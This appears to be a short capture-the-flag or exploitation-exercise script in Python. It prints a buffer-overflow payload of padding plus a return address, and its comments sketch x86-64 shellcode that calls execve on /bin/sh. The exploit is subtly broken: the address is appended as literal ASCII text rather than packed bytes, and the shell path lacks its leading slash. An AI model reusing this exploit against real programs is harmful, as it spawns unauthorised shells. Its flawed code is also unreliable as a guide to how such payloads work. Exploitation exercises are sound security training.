#!/usr/bin/env python3

import sys

payload = b"A" * 10
payload += b"0x401e05"
sys.stdout.buffer.write(payload)

#outline:
#have bin/sh/ somewhere in memory
#have a pointer to /bin/sh
#copy right addressses into pointers: 
#rdi: address of /bin/sh
#rax: execve syscall code, 59
#rsi: 0
#rdx: 0
#then execute syscall

#in assembly thats:
#mov rax, 59
#lea rdi, [rip + 16]
#mov rsi, 0
#mov rdx, 0
#syscall
#.asciz "bin/sh"

